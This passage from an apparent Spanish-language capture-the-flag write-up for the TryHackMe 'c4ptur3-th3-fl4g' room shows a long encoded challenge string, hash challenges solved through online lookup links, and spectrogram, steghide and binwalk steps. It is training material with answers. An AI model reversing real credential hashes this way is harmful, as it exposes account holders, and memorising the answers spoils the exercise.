Z0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMaTB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBLTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMaTB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzBLTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwS0xTMHRMUzBnTGkwdExTMGdMaTB0TFMwZ0xTMHRMUzBnTFMwdExTMGdMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMEtMUzB0TFMwZ0xpMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xTMHRMUzBnTGkwdExTMGdMUzB0TFMwZ0xpMHRMUzA9
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;hashes-1&#34;&gt;HASHES&lt;/h2&gt;
&lt;h3 id=&#34;1-md2&#34;&gt;#1 MD2&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;39d4a2ba07e44421c9bedd54dc4e1182
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://md5hashing.net/hash/md2/39d4a2ba07e44421c9bedd54dc4e1182
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;2-md4&#34;&gt;#2 MD4&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;e0418e7c6c2f630c71b2acabbcf8a2fb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://md5hashing.net/hash/md4/e0418e7c6c2f630c71b2acabbcf8a2fb
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;3-md5&#34;&gt;#3 MD5&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;efbd448a935421a54dda43da43a701e1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://md5hashing.net/hash/md5/efbd448a935421a54dda43da43a701e1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;4-ntlm&#34;&gt;#4 NTLM&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;11FE61CE0639AC2A1E815D62D7DEEC53
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Microsoft has encryption?
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;5-sha512&#34;&gt;#5 SHA512&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a361f05487b879f25cc4d7d7fae3c7442e7849ed15c94010b389faafaf8763f0dd022e52364027283d55dcb10974b09e7937f901584c092da65a14d1aa8dc4d8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://md5hashing.net/hash/sha512/a361f05487b879f25cc4d7d7fae3c7442e7849ed15c94010b389faafaf8763f0dd022e52364027283d55dcb10974b09e7937f901584c092da65a14d1aa8dc4d8
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;6-sha256&#34;&gt;#6 SHA256&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;d48a2f790f7294a4ecbac10b99a1a4271cdc67fff7246a314297f2bca2aaa71f
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://md5hashing.net/hash/sha256/d48a2f790f7294a4ecbac10b99a1a4271cdc67fff7246a314297f2bca2aaa71f
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;7-sha1&#34;&gt;#7 SHA1&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a34e50c78f67d3ec5d0479cde1406c6f82ff6cd0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://md5hashing.net/hash/sha1/a34e50c78f67d3ec5d0479cde1406c6f82ff6cd0
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;spectrograms&#34;&gt;SPECTROGRAMS&lt;/h2&gt;
&lt;p&gt;En este reto nos proporcionan un archivo wav, utilizamos Sonic Vizualiser y agregando una capa de Spectrograma logramos ver la flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/c4ptur3th3fl4g/Screenshot_20200206_003534.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;steganography&#34;&gt;STEGANOGRAPHY&lt;/h2&gt;
&lt;p&gt;Utilizamos steghide para extraer los archivos contenidos dentro de la imagen.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  capture_the_flag steghide extract stegosteg.jpg 
steghide: unknown argument &lt;span class=&#34;s2&#34;&gt;&amp;#34;stegosteg.jpg&amp;#34;&lt;/span&gt;.
steghide: &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;steghide --help&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; help.
➜  capture_the_flag steghide extract -sf stegosteg.jpg
Enter passphrase: 
wrote extracted data to &lt;span class=&#34;s2&#34;&gt;&amp;#34;steganopayload2248.txt&amp;#34;&lt;/span&gt;.
➜  capture_the_flag cat steganopayload2248.txt 
Spa&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;teg%
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;security-through-obscurity&#34;&gt;SECURITY THROUGH OBSCURITY&lt;/h2&gt;
&lt;p&gt;En este reto nos proporcionan una imagen en la que se aplica nuevamente esteganografia.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  capture_the_flag binwalk meme.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             JPEG image data, JFIF standard 1.01
&lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;            0x1E            TIFF image data, big-endian, offset of first image directory: &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;74407&lt;/span&gt;         0x122A7         RAR archive data, version 5.x
&lt;span class=&#34;m&#34;&gt;74478&lt;/span&gt;         0x122EE         PNG image, &lt;span class=&#34;m&#34;&gt;147&lt;/span&gt; x 37, 8-bit/color RGBA, non-interlaced
&lt;span class=&#34;m&#34;&gt;74629&lt;/span&gt;         0x12385         Zlib compressed data, default compression

➜  capture_the_flag binwalk meme.jpg -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             JPEG image data, JFIF standard 1.01
&lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;            0x1E            TIFF image data, big-endian, offset of first image directory: &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
WARNING: Extractor.execute failed to run external extractor &lt;span class=&#34;s1&#34;&gt;&amp;#39;unrar e &amp;#39;&lt;/span&gt;%e&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Errno 2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No such file or directory: &lt;span class=&#34;s1&#34;&gt;&amp;#39;unrar&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;unrar&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;unrar e &amp;#39;&lt;/span&gt;%e&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; might not be installed correctly
